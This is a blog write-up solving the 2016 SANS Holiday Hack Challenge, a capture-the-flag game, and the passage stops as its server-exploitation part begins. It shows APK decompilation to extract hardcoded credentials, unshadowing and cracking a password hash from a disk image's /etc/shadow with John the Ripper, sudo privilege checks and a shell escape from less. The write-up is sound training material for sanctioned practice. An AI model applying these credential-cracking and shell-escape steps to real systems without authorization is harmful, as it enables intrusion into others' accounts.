---
layout: post
title: "2016 SANS Holiday Hack Challenge Writeup"
excerpt_separator: <!--more-->
date: 2016-12-31 03:13:37
disqus: true
author: clay
featured: true
image: assets/images/holidayhack2016/santas_business_card_logo.png
categories:
  - ctf
  - holidayhack
  - python
  - web
---

The great folks at SANS and CounterHack have brought us another adventure in the land of Josh and Jessica Dosis. This years challenge is called Santa's Business Card. The game can be found [here](http://holidayhackchallenge.com). After saving the world from the nefarious plot of the ATNA Corporation last year, siblings Josh and Jessica find themselves in a pickle when Santa gets kidnapped from there house on Christmas Eve. All that is left is Santa's business card. Its up to us to help the Dosis kids save Christmas (again...).


<!--more-->

### Part 1: A Most Curious Business Card

As you can see below, Santa's Business Card gives us a couple links to his social media profile (along with his middle initial, whoda thunk it!).

We are asked a couple initial questions that this clue will lead us to the answers:

```
And that, Dear Reader, is where you get involved. Take a close look at Santa's Business card. You can also inspect the crime scene by entering the Dosis home here. Based on your analysis, please answer the following questions:

1) What is the secret message in Santa's tweets?

2) What is inside the ZIP file distributed by Santa's team?
```

First we will look at Santa's [twitter account](https://twitter.com/SantaWClaus). Santa joined just this past November, and he was really busy for about 2 minutes on the 14th. He tweeted 350 times in those 2 minutes, about 3 tweets per minute. Here is a look at his first tweet from 6:45 AM.

![First Tweet](../assets/images/holidayhack2016/first_tweet.png)

Many Christmas like phrases can be seen in this message - words like joy, peace on earth, elf, Christmas, Santa, etc. The letters W (middle initial) and Q also appear. Scanning through all the tweets, this same type of message is repeated. Every once in a while, a string of periods and other punctuation marks can be found. Knowing that a secret message is hidden in the tweets, I suspect a potential encoding where maybe each Christmas word represents something special.

The first task is to grab all the tweets so I can do some text parsing. I found a handy tool on Github called `tweet_dumper.py` ([source](https://href.li/?https://gist.github.com/yanofsky/5436496)) from user yanofsky. This tool using the `tweepy` and `csv` libraries to create a CSV file of a users tweets. There are some limitations on how many it can grab, but 350 is well below that threshold. Creating an Twitter API key in order to automate the process, I pull down the tweets into a CSV file, ordered newest to oldest. The full output can be seen [here](https://raw.githubusercontent.com/wcmoody/holidayhack/master/santawclaus_tweets.txt). There is no decoding needed as the message is an ASCII art message. I threw together an ugly PIL script to visualize the message. With the following code

```python
from PIL import Image

image = Image.new("RGB", (350,350), "green")

with open('santawclaus_tweets.txt') as f:
    msg = f.readlines()

tweets = [m.split(',')[2] for m in msg[1:]]

for y, tweet in enumerate(tweets):
    for x, char in enumerate(tweet):
        if char == '.':
            image.putpixel((x+130,y), (255,0,0))

image = image.rotate(90)
image.save('tweet_img.png')
```
The created image below reveals the message BUG BOUNTY

![Tweet Image](../assets/images/holidayhack2016/tweet_img.png)

Moving on to the Instagram account for [Santa W. Claus](https://www.instagram.com/santawclaus/), we see he was not nearly has active on this platform. Only three pictures are posted. The first is a very messy computer desk and the other two are seasonal pictures of a warm, cozy fireplace and some exterior Christmas lights. I decide to focus first on the messy desk.

The first thing that jumps out to me is the excellent book, [Violent Python](https://www.amazon.com/Violent-Python-Cookbook-Penetration-Engineers/dp/1597499579), by my friend [TJ O'Connor](https://twitter.com/violentpython) is on the desk. We also can see some SANS course materials for [SEC573](https://www.sans.org/course/python-for-pen-testers): Automating Information Security for Python. Garbage also litters the desk, we see a bag from Walmart and what I am pretty sure is a drink cup from [Baldino's Giant Jersey Subs](http://www.baldinosofaugusta.com). Baldwin's is located in August, GA and one of my favorite restaurants during my visits to Fort Gordon. Though not related to the puzzle, I am pretty sure this is the desk of [Mark Baggett](https://twitter.com/markbaggett), who is the course author of SEC 573, technical editor of TJ's book, and president of the August GA ISSA chapter. (**spoiler alert**: credits of the game also reveal Mark is a contributor to the Holiday Hack Challenge!)

![Instagram Picture 1](../assets/images/holidayhack2016/ig1.jpeg)

But to the real task at hand, we apparently need to find a ZIP file. The computer on the desk has the NORAD Santa Tracker visible in a web-browser. Looking through this site real quickly, a draw the conclusion that they probably have not be coerced into playing along with this game. But zooming in on that website, you can see another window behind it with the following text visible.

```
ath .\ DestinationPath SantaGram_v4.2.zip
```

I quickly attempt to throw this file name on the web root of the holiday hack challenge website, but `404`. But looking closer back at the copy of Violent Python, I see a print out from an nmap scan of `www.northpolewonderland.com`. The root of this website is Santa's business card, so its looks promising. Appending the zip file name to the end of the domain name results in the download of a file!

The `ls` and `file` programs provide us some details on the file.

```shell
$ ls SantaGram_v4.2.zip
SantaGram_v4.2.zip
$ file SantaGram_v4.2.zip
SantaGram_v4.2.zip: Zip archive data, at least v2.0 to extract
```

With unzip we extract the file which is password protected. Trying the message from the twitter account (`bugbounty` - no space)  we unlock the contents to reveal an Android application package file (`.apk`).

```shell
$ unzip SantaGram_v4.2.zip
Archive: SantaGram_v4.2.zip
[SantaGram_v4.2.zip] SantaGram_4.2.apk password:
inflating: SantaGram_4.2.apk
```

#### So the answers to the questions for part one...

* A1: The secret message hidden in Santa's tweets is BUG BOUNTY. This is the password to the zip file hosted at [http://www.northpolewonderland.com/SantaGram_v4.2.zip](http://www.northpolewonderland.com/SantaGram_v4.2.zip)
* A2: Inside the ZIP file distributed by Santa's team, is an Android application package called SantaGram_4.2. Obviously, Santa and the team are working on a new social media mobile app.


### Part 2: Awesome Package Konveyance

![Living Room](../assets/images/holidayhack2016/dosis_living_room.png)

We now enter the game world of the Dosis home. We find Josh and Jessica as we left them last year (maybe a pixel or two taller!). We see the business card, a destroyed Christmas tree, and Santa's bag with a glittering opening. Entering the bag, we are transported to the North Pole.

This 8-bit wonderland is even better than last years environment. We are able to explore all around the north pole meeting other players, non-player characters, and even some real CounterHack personalities (like the Real Ed Skoudis.)

For Part 2, we have to answer the following questions about the APK file found in the zip file from Part 1.

```
Again, Dear Reader, you are called upon to help the children in their analysis as you answer the following questions. If you get stuck, feel free to explore the North Pole and interact with Santa's friendly and helpful elves, who are available to give you hints.

3) What username and password are embedded in the APK file?

4) What is the name of the audible component (audio file) in the SantaGram APK file?
```

Lots of friendly elves around the North Pole with some pointers on APK forensics work.

![Shinny Upatree](../assets/images/holidayhack2016/shinny_upatree.png)

**Shinny Upatree** (inside workshop near the train) recommends just unzipping the APK file and using the `JadX` tool, which can dissemble the .dex file back to Java source code. The elf provides a link to Josh Wright's [presentation](http://www.willhackforsushi.com/presentations/gitd-hackfest.pptx) from Hackfest 2016. He/she also recommends using `Android Studio` to help make sense of obfuscated source code.

![Bushy Evergreen](../assets/images/holidayhack2016/bushy_evergreen.png)

**Bushy Evergreen** (outside of the workshop) recommends `apktool` ([available here](https://ibotpeaches.github.io/Apktool/)) and provides a link to video by Josh Wright on *Manipulating Android Applications* [video](https://www.youtube.com/watch?v=mo2yZVRicW0). This tool allows us to decompile the APK file into smali files, which is a low-language assembly-like language for the dalvik, Android's Java VM implementation. This tool is more powerful that unzipping and recovering Java source code, as we can edit the smali files and recompile, sign, and redeploy into a Android SDK environment. Though not needed in this part of the challenge, this lesson may turn out to be helpful in the future.

After collecting up all these recommendations, its time to set out and try to answer the questions. For Java decompilation (Android and other Java applications), I tend to use an online [Java/APK decompiler](http://www.javadecompilers.com/apk), that is just a front-end for JadX.  I do not recommend online decompilation tools for private files, but since the challenge is open to the public there is no harm uploading these files back online.

For a quick search, I like to use `grep` since the more time I spend in front of a command prompt, the more elite I feel. During a recursive grep though the folder of the decompiled APK file, I get a solid hit on question 4 and plenty of hits on question 3.

```shell
$ grep -r mp3 *
original/META-INF/CERT.SF:Name: res/raw/discombobulatedaudio1.mp3
original/META-INF/MANIFEST.MF:Name: res/raw/discombobulatedaudio1.mp3

$ find . -name "*.mp3"
./res/raw/discombobulatedaudio1.mp3

$ grep -r password * | wc -l
23
$ grep -r username * | wc -l
21
```

Assuming we need to dive into the actual Santagram Java files, I am going to restrict my search to the `com/northpolewonderland/santagram` folder. I will use some command line kungfu to find the lines that contain both *username* and *password*.

```shell
$ grep password *.java | cut -d' ' -f1 | sort | uniq
C0987b.java:
Login.java:
SignUp.java:
SplashScreen.java:

$ grep username *.java | cut -d' ' -f1 | sort | uniq
C0987b.java:
Configs.java:
SignUp.java:
SplashScreen.java:
```

Going through each file one at a time, we see that `SplashScreen.java` contains the username of `guest` and password of `busyreindeer78`.

Specifically in the following block of code that runs from lines 120 - 125

```java
private void postDeviceAnalyticsData() {
    JSONObject jSONObject = new JSONObject();
    try {
        jSONObject.put("username", "guest");
        jSONObject.put("password", "busyreindeer78");
        jSONObject.put("type", "launch");
```

#### So the answers to the questions for part two are ...

* A3: The username and password in the APK are guest and busyreindeer78. They can be found (amongst other places) in SplashScreen.java.
* A4: The name of the audio file is discombobulatedaudio1.mp3 and can be found in the `res/raw` directory and mentioned in the `CERT.SF` and `MANIFEST.MF` files.


### Part 3: A Fresh-Baked Holiday Pi

The Dosis siblings have done all they can with their phones and need some more computing power. Apparently there is a small computer called a Cranberry Pi whose pieces are scattered about the North Pole. Additionally there are a few doors around the North Pole that have access panels that can only be accessed and opened with a functional Cranberry Pi. Our specific guidance for this part is as follows:

```
Now, Dear Reader, scurry around the North Pole and retrieve all of the computer parts to build yourself a Cranberry Pi. Once your Pi is fully operational, please help the Dosis children find and rescue Santa, answering the following questions:

5) What is the password for the "cranpi" account on the Cranberry Pi system?

6) How did you open each terminal door and where had the villain imprisoned Santa?
```

This part has multiple sub parts, so lets work on assembling the Cranberry Pi first.

#### Build a Cranberry Pi

There five parts needed to be found from around the North Pole.

The **Cranberry Pi Board** can be found in a secret room behind the unlit fireplace in Elf House #1. After you cross the bridge from the train station in the south, turn left and enter the second house. Once you enter you will see **Sugarplum Mary**. Just walk right through the fireplace.

![Cranpi Board](../assets/images/holidayhack2016/cranpi_board.png)

The **Heat Sink** can be found in the upstair storage room Elf House #2.This house is located to the right when you cross the bridge. Its the first house. Head up the stairs in the top right corner, and heat sink awaits you.

![Cranpi Heatsink](../assets/images/holidayhack2016/cranp_heatsink.png)

The **Power Cord** is located outside behind the snowman. This is just to the east of the "Days since the last Grinch level event." and to the south of the large tree with the ladder to the NetWars Experience.

![Cranpi Powercord](../assets/images/holidayhack2016/cranpi_powercord.png)

To reach the last two items, you must reach the workshop at the most northern part of the North Pole. Climb the ladder on the tree trunk, enter the NetWars Experience, and exit to the east where a very dark platform can be seen. Once you are back outside, follow the path until you reach the ladder going up into the canopy and the clouds. When you emerge from the clouds you will be outside Santa's workshop. Don't enter just yet, head left out onto the plank and retrieve the **SD Card**.

![Cranpi SD Card](../assets/images/holidayhack2016/cranpi_sdcard.png)

Our final piece of the Cranberry Pi can be found inside the workshop in the reindeer holding area. Head into the main door, go around the barrels and down to the lower platform to the west of where you enter. In the northwest corner you will find three reindeer and the **HDMI Cable** behind the first one.

![Cranpi HDMI](../assets/images/holidayhack2016/cranpi_hdmi.png)

You now have all 5 parts of the Cranberry Pi. You can view the items in your inventory by clicking the backpack icon in the bottom right corner or pressing the I key.

![Full Inventory](../assets/images/holidayhack2016/cranpi_fullinventory.png)

Once you have all the parts, go talk to **Holly Evergreen** at the entrance to the North Poll. Holly will inform you that you need one more element before you can use the Cranberry Pi to access the door panels. You must download the `Cranbian` image from Holly and recover the password for the `cranpi` account. Santa is the only one who knows the password, but he's been kidnapped (as you probably already know.)

![Holly Evergreen](../assets/images/holidayhack2016/cranpi_holly_evergreen.png)

The Cranbian image can be downloaded from [here](https://www.northpolewonderland.com/cranbian.img.zip). Once you download the zipped IMG file, you need to find the elf Wunorse Openslae just north of the bridge. He provides a link to a article about how to deal with multiple SD cards for Raspberry Pi images. I bet this will be helpful.

![Wunorse Openslae](../assets/images/holidayhack2016/wunorse_openslae.png)

Following along with the blog entry, I copy the extracted IMG file into my Ubuntu Precise64 Vagrant VM (since I hack mainly on a MacBook and iMac).

```shell
vagrant@precise64:~$ fdisk -l cranbian-jessie.img

Disk cranbian-jessie.img: 1389 MB, 1389363200 bytes
255 heads, 63 sectors/track, 168 cylinders, total 2713600 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x5a7089a1

Device Boot Start End Blocks Id System
cranbian-jessie.img1 8192 137215 64512 c W95 FAT32 (LBA)
cranbian-jessie.img2 137216 2713599 1288192 83 Linux
```

This give us the sector size and the number of sectors to the beginning of the `ext4` partition. Thus we can calculate the offset for the file system as 70,254,592 bytes. Next step is to create a directory and mount the ext4 partition at that mount point.

```shell
vagrant@precise64:~$ mkdir cranbian
vagrant@precise64:~$ sudo mount -v -o offset=70254592 -t ext4 cranbian-jessie.img cranbian
mount: enabling autoclear loopdev flag
mount: going to use the loop device /dev/loop0
/home/vagrant/cranbian-jessie.img on /home/vagrant/cranbian type ext4 (rw,offset=70254592)
vagrant@precise64:~$ ls -l cranbian/
total 92
drwxr-xr-x 2  root    root  4096   Nov 23 15:11    bin
drwxr-xr-x 2  root    root  4096   Sep 23 03:52    boot
drwxr-xr-x 4  root    root  4096   Sep 23 02:23    dev
drwxr-xr-x 77 root    root  4096   Dec  5 16:25    etc
drwxr-xr-x 3  root    root  4096   Nov 21 15:25    home
drwxr-xr-x 17 root    root  4096   Nov 23 15:07    lib
drwx------ 2  vagrant root 16384   Sep 23 03:52    lost+found
drwxr-xr-x 2  root    root  4096   Sep 23 02:20    media
drwxr-xr-x 2  root    root  4096   Sep 23 02:20    mnt
drwxr-xr-x 3  root    root  4096   Sep 23 02:27    opt
drwxr-xr-x 2  root    root  4096   Jan  7 2015     proc
drwx------ 2  root    root  4096   Nov 23 15:14    root
drwxr-xr-x 5  root    root  4096   Sep 23 02:28    run
drwxr-xr-x 2  root    root  4096   Sep 23 02:39    sbin
drwxr-xr-x 2  root    root  4096   Sep 23 02:20    srv
drwxr-xr-x 2  root    root  4096   Apr 12 2015     sys
-rw-r--r-- 1  root    root    12   Dec 15 03:12    test
drwxrwxrwt 7  root    root  4096   Nov 17 20:17    tmp
drwxr-xr-x 10 root    root  4096   Sep 23 02:20    usr
drwxr-xr-x 11 root    root  4096   Nov 23 15:10    var
```

We can see we have the entire file system for the Cranbian image.  Another friendly elf in the North Pole recommends a good way to crack passwords. Minty Candycane can be found in the Small Tree House right outside of the NetWars Experience. She recommends John the Ripper for password cracking. She also mentions the rockyou password list that can be found here.

![Minty Candycane](../assets/images/holidayhack2016/minty_candycane.png)

You can find some good example of how to use john on the inter-webs. Since I mounted the Cranbian image on a VM in which I have root, I am able to view the /etc/passwd and /etc/shadow files. The following cracks the password for the cranpi account wide open...

```shell
vagrant@precise64:~$ unshadow cranbian/etc/passwd cranbian/etc/shadow > mypasswd

vagrant@precise64:~$ tail -1 mypasswd

cranpi:$6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0:1000:1000:,,,:/home/cranpi:/bin/bash

vagrant@precise64:~$ ln -s rockyou.txt /usr/share/john/passwd.lst

vagrant@precise64:~$ john mypasswd

vagrant@precise64:~$ tail -5 .john/john.log

0:00:00:02 - Wordlist file: /usr/share/john/password.lst
0:00:00:02 - 57 preprocessed word mangling rules
0:00:00:02 - Rule #1: ':' accepted as ''
0:00:19:36 + Cracked cranpi
0:00:19:36 Session completed

vagrant@precise64:~$ tail -1 .john/john.pot

$6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0:yummycookies

vagrant@precise64:~$ tail -1 .john/john.pot | cut -d":" -f2
yummycookies
```

Now that we have the password to the cranpi account, we can return to Holly Evergreen and give her the help she needs. Once we give her the password, our Cranberry Pi becomes operational and we can return to the door access panel spread throughout the North Pole.

#### Open all the Terminal Doors throughout the North Pole

The terminal doors were a nice way of adding some actual hacking inside the game environment. Last year, you played in the game world but only to unlock achievements, retrieve files and get some hints from SANS / CounterHack personalities. I really liked this addition and they were critical to answer all of the questions in the second half of Part 3.

The doors are marked with a little cranberry icon but during December they were hard to see because of the crowd of players at each panel. Another way to know a panel was near by was trying to access a door and seeing the password panel below. Once you access the panel with your Cranberry Pi, you are presented with a pop up terminal window in a very limited Linux environment.

![Panel LCD](../assets/images/holidayhack2016/panel_lcd.png)

The first door can be found inside of elf house #1. This is the same house in which we found the Heat Sink upstairs.

![Elfhouse Panel 1](../assets/images/holidayhack2016/elfhouse_1_panel.png)

The panel prompts us to recover the two parts of the passphrase from the file `/out.pcap`. The first thing to do is check the permissions on the file. We see that the owner is `itchy` and we are logged in as `scratchy`. This is reference a cat and a mouse characters from a show inside the show of *The Simpsons*. Add these to our list of potential perpetrators. Itchy is the only user that can read the packet capture file. The Linux `sudo` utility allows us to execute commands as other users. Traditionally this is used for root level actions if so permitted. But it requires the current user to provide their password. We do not know the scratchy password (or at least we do not know we know it). So this does not help. We can run the sudo command with the `-l` to list the allowed and disallowed commands. The excerpt from the man page for sudo explains:

>>If no command is specified, the -l (list) option will list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host. If a command is specified and is permitted by the security policy, the fully-qualified path to the command is displayed along with any command line arguments.

With this knowledge, we can check if we have any special permissions on this box. As you can see below, we can in fact run two programs as itchy without a password (score!). To execute a command as another user with `sudo`, we would use the `-u` argument.

![Itchy Panel 1](../assets/images/holidayhack2016/itchy_panel_1.png)

The `strings` program allows us to see all instances of 4 or more printable characters. This tool is great for finding valuable information from binaries, images, or other media. The `tcpdump` program is traditionally used to capture network traffic to generate PCAP files, but it also can be used to examine an existing PCAP.

First we will use the handy strings program on our PCAP. Piping the output to word count (`wc`) we see we have over 13,000 lines of strings. The program `head` allows us to see the first ten line. It appears we have some web traffic from `wget` for a file named `firsthalf.html`.  Let's see if any credentials were passed in the clear. We are looking for a passphrase or password so we will grep the strings output for that. No hits for either *pass* or *user*. Since we are looking for parts of a pass phrase, I will try the search for the word *part*. Boom! there it is. A hidden field on a html form labeled `part1` with a value of `santasli` You can see the terminal commands and outputs below.

![Itchy Panel 2](../assets/images/holidayhack2016/itchy_panel_2.png)

For the second part, I guess we have to use tcpdump. The `-r` argument will allow us to use a patch capture as the read input file to the program. By default, we will get the packet headers consisting of the source and destination IP address and ports along with some other data about the connections. To see the content of the packet capture, we can use the `-X` or `-A` flag (hex or ascii output) along with a snap length of 0 (meaning all data).  Looking through the dump we see the http retrival of the file `secondhalf.bin`. This request comes from IP:PORT address `192.168.188.1:52103`, so I will refine my `tcpdump` command to only look at traffic that is returning to this socket with the destination port argument. Again using `grep`, we can see there were 179 packets needed to return this file.

![Itchy Panel 3](../assets/images/holidayhack2016/itchy_panel_3.png)

Further examination of the data with `-X` and `-A` reveal there is 65,000+ lines of hexadecimal output and 4500+ lines of ascii output. With limited tools on this box (no `python` and no `less`) and no way to exfiltrate a file from this system, I decide to guess the second half. My first guess is successful! Sticking to the theme of *The Simpson*, I guess the name of the family dog, **Santa's Little Helper**.

**FULL DISCLOSURE:** A few days after guessing this password, I was reading the reddit on the Holiday Hack Challenge, and *Jeff McJunkin* gave a great hint on this. He said:

>>What types of strings does the strings utility look for, by default? #hint

Heading back to the `man` page for `strings`, I see the `-e` option allows you to change the encoding. Cycling through the choices, I get a hit on 16-bit littleendian `-l`. Still interested to know the binary does. Many people tried to pull it off the terminal. Heard someone did the entire PCAP via base64 and copy and paste.... smh

![Itchy Panel 4](../assets/images/holidayhack2016/itchy_panel_4.png)

The new room reveals another elf with some JSON hints for later. But also one of my favorite Easter eggs, The *Rogue One* movie poster on the wall (more on that later.)

![Rogue One Poster](../assets/images/holidayhack2016/rogue_one.png)

The next three doors are all located in Santa's workshop at the most northern portion of the North Pole. There is one near the reindeer pen, one at the top of the winding staircase, and one on the train in the eastern wing.

![Stable Door Panel](../assets/images/holidayhack2016/stable_door_wumpus.png)

Going to the panel near the reindeer pen, we are presented with the instructions to recovery the passphrase from the wumpus. We further are told we can cheat or not. Looking in the home directory of our user elf, we see one file. The program wumpus is world executable. We do not have the program file or hexdump, but we can cat the executable and pipe to head to see this is an 64-bit ELF file (punny).

![Wumpus Intro](../assets/images/holidayhack2016/wumpus_intro.png)

The program is a version of Hunt the Wumpus in which you navigate a labyrinth of rooms to try and kill the wumpus. You start with 5 arrows and have to shoot and move, avoiding a bat until you kill the wumpus. Once you smell the creature, you fire an arrow into each of the adjoining rooms. Once you die, you can start back over in the same random game board. I could not figure out how to cheat, but I did win. As you can see below, the passphrase is `WUMPUS IS MISUNDERSTOOD`

![Wumpus Victory](../assets/images/holidayhack2016/wumpus_victory.png)

Using the passphrase, we enter into another section of the reindeer pen with a few additional reindeer. There does not appear to be anything interesting here at this TIME.

![Workshop Door](../assets/images/holidayhack2016/workshop_door_directory.png)

The next door is at the top of the winding stair case. We are instructed to find the passphrase buried deep in the file contents. So magic with the find program will quickly reveal this secret. With a wildcard in the name option, we can see all the files very quickly. They tried to hide the file with hidden directories that start with a period, directories that are just a space and other special characters which make it hard to see with normal tools. As you can see below a file called key_for_the_door.txt.

![Hiden File Panel 1](../assets/images/holidayhack2016/hidden_file_panel_1.png)

We can refine our find command to be more specific for the file we want, then use the -exec option to pass that file name to the cat program. We see the passphrase is open_sesame.

![Hidden File Panel 2](../assets/images/holidayhack2016/hidden_file_panel_2.png)

This passphrase opens up the door to Santa's office. In the office we see another panel between two bookcases, a large desk with an interesting tiny police call box, and some other furniture decorating the edges. Since we are here, lets see what these panel does.

![Santa's Office](../assets/images/holidayhack2016/santas_office.png)

We presented with a prompt that greets us as "Professor Faulken." For those that are not children of the 80s, this is a reference to a character from the 1983 film WarGames. We can interact with the service but for all incorrect responses we are told by Joshua/WOPR that he does not understand. We must find the exact phrase it is expecting. In fact, this challenge is a more recent reference to a task in the treasure hunt in the amazing book Ready Player One by Ernest Cline. We can refer to YouTube clips to see the scene where Matthew Broderick's characters does this exact interaction. Below you will see my interactions with the system (you have to be exact with punctuation and capitalization)

![WarGames Part 1](../assets/images/holidayhack2016/wargames_1.png)

![WarGames Part 2](../assets/images/holidayhack2016/wargames_2.png)

![WarGames Part 3](../assets/images/holidayhack2016/wargames_3.png)

So we have another passphrase `LOOK AT THE PRETTY LIGHTS` that we can use later when we find another entry point. A couple interesting points about this challenge. Early on while trying to figure out what to do, I hit `Ctrl-C` and was able to make the python script running to break. This bug has been fixed, but you can see the message below.

```python
^CTraceback (most recent call last):
 File "/home/elf/wargames.py", line 76, in <module>
 response=raw_input()
KeyboardInterrupt
```

For a while, I thought we had to exploit `raw_input()` or possible have it catch a different signal. But it was either a bug or a red herring.

Once I realized the interactions had to be exact (I was initially forgetting the period at the end of "Hello"), I paused the YouTube clip above at this frame to see all the responses.

![WarGames Blooper](../assets/images/holidayhack2016/wargames_blooper.png)

The problem with this shot is that its a blooper. When David Lightman (Broderick) first enters the response to the account removal question, he correctly spells mistakes but above, you see it is missing the e and period. Very ironic that the **mistake** was on *mistake*. I would not have put it past the folks at CounterHack to either only except this response or at least acknowledge it with another Easter Egg.

The terminal door is the one on the train in the east wing of the workshop. This is the same location where Shinny Upatree gave us the hint about using JadX on the APK file.

![](../assets/images/holidayhack2016/train_door_fluxcapactior.png)

##### Look closely at that mob of people and you can see my friend ryko212 who was busy hacking when I replayed the game to get some screenshots

This terminal brings you to a console to control the train. You are presented with a few menu options: get the train status, set the brakes, release the brakes, start the train, open the help document, or quit.

![Train Menu](../assets/images/holidayhack2016/train_menu.png)

Trying to start the train, it will tell you the brakes have to be off. Once you release the brake and try to start the train, you have to enter a password. You can try all the passwords we have seen so far in the game, but they will not work.

![Train Brake Off](../assets/images/holidayhack2016/train_brakeoff_start.png)

Checking out the help document, we get an indication that we are working in a potential vulnerable application. The highlighted path of the file in the bottom left corner is an indication we are in some version of `/usr/bin/less`. This application has allows you to execute other commands with the ! button. This feature exists in `less`, `vi`, `man` pages, and other applications.

![Train Help](../assets/images/holidayhack2016/train_help_screen.png)

With a `!sh` we can now get a shell on this box. We are the user `conductor` and we have a few interesting train files in our home directory.

![Train Shell](../assets/images/holidayhack2016/train_shell.png)

The `TrainHelper.txt` file is the file we were just viewing in the Help menu. The `Train_Console` file is the script that executes when you connect to the terminal. You can view the entire file [here](https://raw.githubusercontent.com/wcmoody/holidayhack/master/Train_Console), but the interesting details can be seen below:

![Train Password](../assets/images/holidayhack2016/train_password.png)

We can see that the START option, requests a password which it compares to a local variable called `$PASS`. This password is `24fb3e89ce2aa0ea422c3d511d40dd84` and if it matches it will run the `ActivateTrain` program. We could go back and enter the password in the console application, but lets just activate the train from here.

![Train Flux Capacitor](../assets/images/holidayhack2016/train_flux.png)

Look like this train is installed with a *Back to the Future* style Flux Capacitor that allows time travel to happen. The train has recently returned from November 16, 1978 and is currently set to return to that date. Pressing enter accelerates us to 88 mph, provides some awesome animated ascii art and takes us back to 1978! **Who** could possibly have traveled back in time and why? Oh the puns.

![1978](../assets/images/holidayhack2016/1978.png)

1978 North Pole greets us with a nice piece of snow art showing us the year. 1978 also has a nice sepia tint. No need to grab a newspaper to confirm the date. The creativity of the CounterHack team with 1978 is some of the most fun of the entire game. Each elf's conversation is loaded with puns about "future" technologies and closely relates to what they tell you in 2016. For instance **Holly Evergreen** who in 2016 provides you the Cranbian image once you assemble all the parts, has the following to say:

>>My aunt gave me her famous Cran Pi recipe, which seems simple - there are only five ingredients! But I don't understand these instructions. What do you mean the heat sinks?

I will leave the connection of the rest of the quotes to the technology as an exercise to the reader. Some other interesting observations include the much higher count down on the "Days Since the Last Grinch-Level Event." In 2016 it's a counter since Christmas Eve 2015 and the ANTAS Corporations foiled plot. Doing the math and using some handy *days-between-dates* website, we see the 1978 counter measures days since the premier of *Dr Seuss' How the Grinch Stole Christmas* television special on December 18, 1966.

![Grinch Level Event 1978](../assets/images/holidayhack2016/grinch_event_1978.png)

But my favorite pun is the poster above the bed in Elf House #2, in 2016 it was Rogue One, but in 1978 it's the original Star Wars film, now know as Episode IV: A New Hope. Quite a commentary on current culture, when a movie that takes places immediately before another one that was released 39 years earlier.

![Star Wars Poster](../assets/images/holidayhack2016/star_wars_poster.png)

Back to the task at hand, let's find Santa Claus. Running through all the known areas of the North Pole, we find that all previously Cranberry Pi locked doors are open, since the technology does not exist at a consumer level to provide access control. When we reach the additional reindeer pen that was previously locked by the Wumpus game, we find Santa Claus safe and sound (though a little forgetful).

![Santa Rescued](../assets/images/holidayhack2016/santa_claus_rescued.png)

Talking to the big man (**I know him!**), he discover he does not remember who, how, or why he was kidnapped and brought to 1978. We unlock another achievement and then the credits roll.

This brings us to the end of Part 3.

#### So the answers to the questions for part three are ...

* A5: The password for the "cranpi" account on the Cranberry Pi is `yummycookies`

* A6: Each terminal door was opened as described above, and Santa was imprisoned by the villain in the reindeer pen in 1978.


### Part 4: My Gosh... It's Full of Holes

The fun game now is all over and its time to get seriously hacking. We are now are tasked to recover 6 more additional audio files similar to the one in the Android app. Our specific instructions are:

```
And yet again, Dear Reader, you are called upon to help the Dosis children, this time by exploiting various servers associated with the SantaGram application. Analyze the clues you've been provided on Santa's business card and the SantaGram APK file to identify target systems. Then, check with Tom Hessman at the North Pole to confirm that each IP address you find is included in the scope of your work. Each server has at least one flaw you can exploit to retrieve a small audio file on the system. If you get stuck, feel free to visit the elves of the North Pole for hints about various kinds of vulnerabilities and attacks you might find useful.

7) ONCE YOU GET APPROVAL OF GIVEN IN-SCOPE TARGET IP ADDRESSES FROM TOM HESSMAN AT THE NORTH POLE, ATTEMPT TO REMOTELY EXPLOIT EACH OF THE FOLLOWING TARGETS:

The Mobile Analytics Server (via credentialed login access)
The Dungeon Game
The Debug Server
The Banner Ad Server
The Uncaught Exception Handler Server
The Mobile Analytics Server (post authentication)
```

So we have need to find some IP addresses  and get them approved before we unleash our bits across the network. Good advice, don't want any desk pops.

Going back to the APK file, lets search the files or IP addresses. Using recursive grep with regular expressions lets look for any IP addresses (or at least 4 numbers separated by periods, no need to limit to range of 0-255)

```shell
$ grep -r -E "\d+\.\d+\.\d+\.\d+" *
com/northpolewonderland/santagram/Me.java: /* renamed from: com.northpolewonderland.santagram.Me.3.2.1.1 */
com/northpolewonderland/santagram/Me.java: /* renamed from: com.northpolewonderland.santagram.Me.3.2.1.1.1 */
com/northpolewonderland/santagram/Me.java: /* renamed from: com.northpolewonderland.santagram.Me.3.2.1.1.1.1 */
com/northpolewonderland/santagram/Me.java: /* renamed from: com.northpolewonderland.santagram.Me.4.a.1.1.2.1 */
com/northpolewonderland/santagram/PostDetails.java: /* renamed from: com.northpolewonderland.santagram.PostDetails.5.1.1.1 */
com/parse/OfflineStore.java: /* renamed from: com.parse.OfflineStore.26.1.1.1 */
com/parse/OfflineStore.java: /* renamed from: com.parse.OfflineStore.26.1.1.2 */
```

We get a few hits, but nothing that is an IP address. Now lets look for urls with domain names. Assuming they are going to have northpolewonderland as part of the domain name.

```shell
$ grep -r -E https?:// * | grep northpolewonderland
AndroidManifest.xml:<manifest xmlns:"http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="4.2" package="com.northpolewonderland.santagram" platformBuildVersionCode="23" platformBuildVersionName="6.0-2704002">
com/northpolewonderland/santagram/Configs.java:            Parse.initialize(new Builder(this).applicationId(String.valueOf(PARSE_APP_KEY)).clientKey(String.valueOf(PARSE_CLIENT_KEY)).server("https://www.northpolewonderland.com/parse").build());
res/values/strings.xml:    <string name="analytics_launch_url">https://analytics.northpolewonderland.com/report.php?type=launch</string>
res/values/strings.xml:    <string name="analytics_usage_url">https://analytics.northpolewonderland.com/report.php?type=usage</string>
res/values/strings.xml:    <string name="banner_ad_url">http://ads.northpolewonderland.com/affiliate/C9E380C8-2244-41E3-93A3-D6C6700156A5</string>
res/values/strings.xml:    <string name="debug_data_collection_url">http://dev.northpolewonderland.com/index.php</string>
res/values/strings.xml:    <string name="dungeon_url">http://dungeon.northpolewonderland.com/</string>
